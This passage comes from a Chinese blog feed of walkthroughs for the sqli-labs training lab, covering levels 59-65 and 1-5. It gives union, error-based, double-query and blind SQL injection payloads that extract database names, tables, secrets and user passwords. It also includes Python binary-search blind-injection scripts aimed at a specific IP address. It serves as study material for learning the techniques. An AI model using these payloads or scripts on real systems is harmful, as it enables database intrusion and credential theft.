L5EO2900B1),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/3.jpeg" alt></p>
<p>双注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=0' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables%<span class="number">20</span> <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>这个双注入payload实在是太长了，不仔细就很容易写错，以后还要多加练习</p>
<h1 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h1><p>这一关为数字型注入，任然使用双查询或者报错注入，过滤了注释，所以id只能=0<br>双注入</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,count(*),concat_ws(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),floor(rand()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span>%<span class="number">20</span> <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure>

<p>报错注入</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/4.jpeg" alt></p>
<h1 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h1><p>这一关为双引号+小括号闭合<br>报错注入</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>=1") <span class="keyword">and</span> updatexml(1,concat(0x7e,(database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p>双注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=0") union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h1 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h1><p><s>这一关过滤了注释，我们可以使用<code>or&#39;1&#39;=&#39;1</code>来闭合</s><br>然后方法与上几关相同<br>但是在注入额时候发现回显报错多了两个小括号，于是从新测试，发现是单引号+两个小括号闭合，并没有过滤掉注释<br>使用报错注入</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span>')) and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/5.jpeg" alt><br>双注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=0')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h1 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h1><p>这一关为单引号闭合，但是过滤了注释，可以使用or’来闭合。然后发现使用联合注入和报错注入均无回显，于是考虑盲注，但是由于必须要在130步内做出来，所以我们选择二分法盲注<br>盲注脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">DB=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    high=<span class="number">128</span></span><br><span class="line">    mid=(low+high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload=<span class="string">"?id=0' or ascii(substr(database(),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" or'"</span></span><br><span class="line">        payload2=<span class="string">"?id=0' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" or'"</span></span><br><span class="line">        payload3=<span class="string">"?id=0' or ascii(substr((select column_name from information_schema.columns where table_name='WWC43V137C' limit 2,1),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" or'"</span></span><br><span class="line">        payload4=<span class="string">"?id=0' or ascii(substr((select group_concat(secret_XCW5) from WWC43V137C ),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" or'"</span></span><br><span class="line">        url=<span class="string">"http://116.62.104.172:81/Less-62/"</span>+payload4</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            mid=(low+high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high) // <span class="number">2</span></span><br><span class="line">    DB+=chr(mid)</span><br><span class="line">    print(DB)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/6.jpeg" alt><br>二分法的速度的确很快，<br>大致的流程为</p>
<blockquote>
<p>1、mid为left和right的中间值，mid是否和left相等，相等跳到5，如果不等跳到2</p>
<p>2、请求mid，如果返回正确的页面跳到3，如果返回错误的页面跳到4</p>
<p>3、返回页面正确，将right赋值为mid</p>
<p>4、返回页面错误，将left赋值为mid</p>
<p>5、返回mid值</p>
</blockquote>
<h1 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h1><p>本关为单引号闭合，未过滤注释符<br>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">DB=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    high=<span class="number">128</span></span><br><span class="line">    mid=(low+high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload=<span class="string">"?id=0' or ascii(substr(database(),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        payload2=<span class="string">"?id=0' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        payload3=<span class="string">"?id=0' or ascii(substr((select column_name from information_schema.columns where table_name='NK6CAXDABM' limit 2,1),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        payload4=<span class="string">"?id=0' or ascii(substr((select group_concat(secret_BKHX) from NK6CAXDABM ),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        url=<span class="string">"http://116.62.104.172:81/Less-63/"</span>+payload4</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            mid=(low+high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high) // <span class="number">2</span></span><br><span class="line">    DB+=chr(mid)</span><br><span class="line">    print(DB)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/7.jpeg" alt></p>
<h1 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h1><p>本关为数字型盲注<br>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">DB=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    high=<span class="number">128</span></span><br><span class="line">    mid=(low+high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload=<span class="string">"?id=1 and ascii(substr(database(),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)</span><br><span class="line">        payload2=<span class="string">"?id=1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)</span><br><span class="line">        payload3=<span class="string">"?id=1 and ascii(substr((select column_name from information_schema.columns where table_name='NI5Q7GBP8D' limit 2,1),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)</span><br><span class="line">        payload4=<span class="string">"?id=1 and ascii(substr((select group_concat(secret_XCQ7) from NI5Q7GBP8D),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)</span><br><span class="line">        url=<span class="string">"http://116.62.104.172:81/Less-64/"</span>+payload4</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            mid=(low+high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high) // <span class="number">2</span></span><br><span class="line">    DB+=chr(mid)</span><br><span class="line">    print(DB)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/8.jpeg" alt></p>
<h1 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h1><p>这一关为双引号+括号闭合<br>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">DB=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    high=<span class="number">128</span></span><br><span class="line">    mid=(low+high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload=<span class="string">"?id=0\") or ascii(substr(database(),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        payload2=<span class="string">"?id=0\") or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        payload3=<span class="string">"?id=0\") or ascii(substr((select column_name from information_schema.columns where table_name='THSLMU136W' limit 2,1),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        payload4=<span class="string">"?id=0\") or ascii(substr((select group_concat(secret_KM0T) from THSLMU136W),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        url=<span class="string">"http://116.62.104.172:81/Less-65/"</span>+payload4</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            mid=(low+high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high) // <span class="number">2</span></span><br><span class="line">    DB+=chr(mid)</span><br><span class="line">    print(DB)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/9.jpeg" alt><br>sqli-labs到这来就结束了，大概花了一个月的时间，后面这几关更像是对以前学习的一个复习(联合查询，报错注入，双注入，盲注)。从这一系列实验中学到了一些基本的sql注入技巧和判断注入类型，期间一直参考<a href="https://www.jianshu.com/u/f5a5bfa4f659" target="_blank" rel="noopener">Hyafinthus</a>大佬的文章，写得十分详细，建议参考ヾ(●´∀｀●) 。后面会将这些基本的sql注入技巧做一个总结，以加深记忆。</p>
]]></content>
      <tags>
        <tag>sqli_labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli_labs1-20</title>
    <url>/2020/02/27/sqli_labs--less-1-10/</url>
    <content><![CDATA[<p>GET-Error based-Single quotes-String<a id="more"></a></p>
<h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><p>提示我们使用id</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/1.gif" alt="clipboard.png"></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>  回显正确</span><br><span class="line">?id=<span class="number">1</span> and <span class="number">1</span>=<span class="number">1</span></span><br><span class="line">?id=<span class="number">1</span> and <span class="number">1</span>=<span class="number">2</span> 可以正常回显</span><br><span class="line">?id=<span class="number">1</span>'  回显错误</span><br><span class="line">是单引号闭合错误</span><br><span class="line">?id=<span class="number">1</span>' and '<span class="number">1</span>'='<span class="number">1</span>   回显正常</span><br><span class="line">?id=<span class="number">1</span>' and '<span class="number">1</span>'='<span class="number">2</span>   无回显</span><br><span class="line">?id=<span class="number">1</span>'--+  回显正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/2.gif" alt="clipboard.png"></p>
<p>接下来就可以使用常规的联合注入<br>order by来测试表的列数</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/3.gif" alt="clipboard.png"></p>
<p>发现是三个<br>接下来使用联合查询union</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1.2</span><span class="number">.3</span><span class="comment">--+</span></span><br><span class="line"><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> 只是为了保证<span class="keyword">union</span>前后两个语句的列数相同，</span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span> 则是为了使前一个查询无返回结果从而返回第二个 <span class="keyword">select</span> 的查询结果,只需要将数字替换为相应的想要查询的信息即可.比如：</span><br><span class="line">?<span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">user</span>()<span class="comment">--+</span></span><br><span class="line">下面使用MySQL自带的一个表information_schema，依次爆库名，爆表名，爆列名，爆数据了</span><br></pre></td></tr></table></figure>

<p>爆库名</p>
<h2 id><a href="#" class="headerlink" title></a></h2><p>?id=-1’ union select 1,database(),3–+</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/4.gif" alt="clipboard.png"></p>
<p>爆表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) ,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/5.gif" alt="clipboard.png"></p>
<p>爆列名</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1' union select 1,group_concat(column_name) ,3 <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span>--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/6.gif" alt="clipboard.png"></p>
<p>查询数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) ,<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/7.gif" alt="clipboard.png"></p>
<h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><p>还是用ID查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1 and 1=1 正常回显</span><br><span class="line">?id=1 and 1=2 无回显，不报错</span><br><span class="line">?id=1&apos; 会报错，原因是单引号出现了奇数次 </span><br><span class="line">整型注入，用order by测试，发现有3列</span><br><span class="line">?id=1 order by 4--+会报错</span><br></pre></td></tr></table></figure>

<p> <img src="/2020/02/27/sqli_labs--less-1-10/21.jpg" alt="clipboard.png"></p>
<p>使用union查询</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,3--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/22.jpg" alt="clipboard.png"></p>
<p>然后与1一样</p>
<p>爆库</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">database</span>(),3--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/23.jpg" alt="clipboard.png"></p>
<p>得到数据库名字为security后</p>
<p>爆表</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/24.jpg" alt="clipboard.png"></p>
<p>爆列</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/25.jpg" alt="clipboard.png"></p>
<p>爆数据</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1 union select 1,username,password <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=3--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/26.jpg" alt="clipboard.png"></p>
<h1 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h1><p>输入?id=1’，报错：</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/31.gif" alt="clipboard.png"></p>
<p>报错提示说)不对，可见是单引号后面加括号形成的查询语句<br>尝试构造?id=1’)–+,发现可以正常回显。</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/32.gif" alt="clipboard.png"></p>
<p>然后就和Less-1一样的步骤</p>
<p>爆库</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span>) <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">database</span>(),3--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/33.gif" alt="clipboard.png"></p>
<p>得到数据库名字为security后</p>
<p>爆表</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1') union select 1,2,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">'security'</span>--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/34.gif" alt="clipboard.png"></p>
<p>爆列</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1') union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span>--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/35.gif" alt="clipboard.png"></p>
<p>爆数据</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1') union select 1,username,password <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=3--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/36.gif" alt="clipboard.png"></p>
<h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h1><p>输入’,无变化；</p>
<p>输入”,报错，并且提示括号</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/41.gif" alt="clipboard.png"></p>
<p>?id=1”)–+正常回显</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/42.gif" alt="clipboard.png"></p>
<p>接下来与前面一样</p>
<p>爆库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1") union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/43.gif" alt="clipboard.png"></p>
<p>得到数据库名字为security后</p>
<p>爆表</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1") union select 1,2,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">'security'</span>--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/44.gif" alt="clipboard.png"></p>
<p>爆列</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1") union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span>--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/45.gif" alt="clipboard.png"></p>
<p>爆数据</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1") union select 1,username,password <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=3--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/45.gif" alt="clipboard.png"></p>
<h1 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h1><p>输入id=1  正常无回显<br>输入id=1’  错误无回显<br>输入id=1’–+ 正常<br>但是我们不能注出库名等信息<br>利用双查询注入，可以得出数据库名称 </p>
<p>了解双注入之前先了解<strong>子查询</strong>：</p>
<p> 子查询可以简单的理解在一个select语句里还有一个select，里面的这个select语句就是子查询，子查询要用单引号闭合</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">select concat((<span class="name">select</span> database()))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/51.gif" alt="clipboard.png"></p>
<p>concat()函数真正执行的时候，先从子查询进行。因此执行select database()这个语句就会把当前的数据库查出来，然后把结果传入到concat函数。</p>
<p> 一些Mysql语法<br>rand()函数<br>随机函数：返回0~1间的小数。<br>floor()函数<br>小数向下取整函数。向上取整函数：ceiling()<br>count()函数<br>汇总函数：返回匹配指定条件的行数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/52.gif" alt="clipboard.png"></p>
<p> group by子句</p>
<p>分组语句：常用于结合合计函数，根据一个或多个列对结果集进行分组。</p>
<p>如有这样一个表：</p>
<table>
<thead>
<tr>
<th>customer</th>
<th>price</th>
</tr>
</thead>
<tbody><tr>
<td>alice</td>
<td>2300</td>
</tr>
<tr>
<td>charlie</td>
<td>4000</td>
</tr>
<tr>
<td>alice</td>
<td>700</td>
</tr>
<tr>
<td>bob</td>
<td>1600</td>
</tr>
<tr>
<td>bob</td>
<td>400</td>
</tr>
</tbody></table>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select customer,sum(price) <span class="keyword">from</span> orders<span class="built_in"> group </span>by customer(价钱总和)</span><br></pre></td></tr></table></figure>

<p>得到的结果就是：</p>
<table>
<thead>
<tr>
<th>customer</th>
<th>price</th>
</tr>
</thead>
<tbody><tr>
<td>alice</td>
<td>3000</td>
</tr>
<tr>
<td>charlie</td>
<td>4000</td>
</tr>
<tr>
<td>bob</td>
<td>2000</td>
</tr>
</tbody></table>
<p>如果没加group by，结果就有了重复项：</p>
<table>
<thead>
<tr>
<th>customer</th>
<th>price</th>
</tr>
</thead>
<tbody><tr>
<td>alice</td>
<td>3000</td>
</tr>
<tr>
<td>charlie</td>
<td>4000</td>
</tr>
<tr>
<td>alice</td>
<td>3000</td>
</tr>
<tr>
<td>bob</td>
<td>2000</td>
</tr>
<tr>
<td>bob</td>
<td>2000</td>
</tr>
</tbody></table>
<p><strong>双查询注入原理</strong></p>
<p>当在一个聚合函数，比如count()函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p>
<p>1.rand()函数返回0~1间的数，*2向下取整后非0即1：</p>
<p>select floor(rand())</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/53.gif" alt="clipboard.png"></p>
<p>select floor(rand()*2)</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/54.gif" alt="clipboard.png"></p>
<p>2.子查询返回的结果用concat_ws()函数连接，可以看到显示的值中有数据库名，数据库名之后连接的非0即1：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">concat_ws</span>(<span class="string">'-'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/55.gif" alt="clipboard.png"></p>
<p>3.如果在这条语句后面加上from一个表名，那么会返回dvwa-0或dvwa-1的一个集合，数目是由表本身有几条结果决定的：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">concat_ws</span>(<span class="string">'-'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/56.gif" alt="clipboard.png"></p>
<p>如果是从information_schema.schemata里，这个表包含了mysql的所有数据库名，则会返回数据库数个结果。</p>
<p>4.我们使用information_schema.tables或者information_schema.columns两个表来查询想要的信息。</p>
<p>我们把concat_ws(‘-‘,(select database()),floor(rand()*2))这个结果取了一个别名a，然后使用它进行分组。这样相同的dvwa-0分到一组，dvwa-1分到一组,就剩下两个结果了:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> concat_ws(<span class="string">'-'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),floor(rand()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/57.gif" alt="clipboard.png"></p>
<p>这里的database()可以替换成任何想查的函数，比如version()，user()等。</p>
<p> 5.最后一步，使报错中显示想要查询的结果：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> count(*),concat_ws(<span class="string">'-'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),floor(rand()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/58.gif" alt="clipboard.png"></p>
<p> 注入过程</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>'order <span class="keyword">by</span> <span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>使用order by判断出其有三个字段</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/59.gif" alt="clipboard.png"></p>
<p>报错查询数据库名称</p>
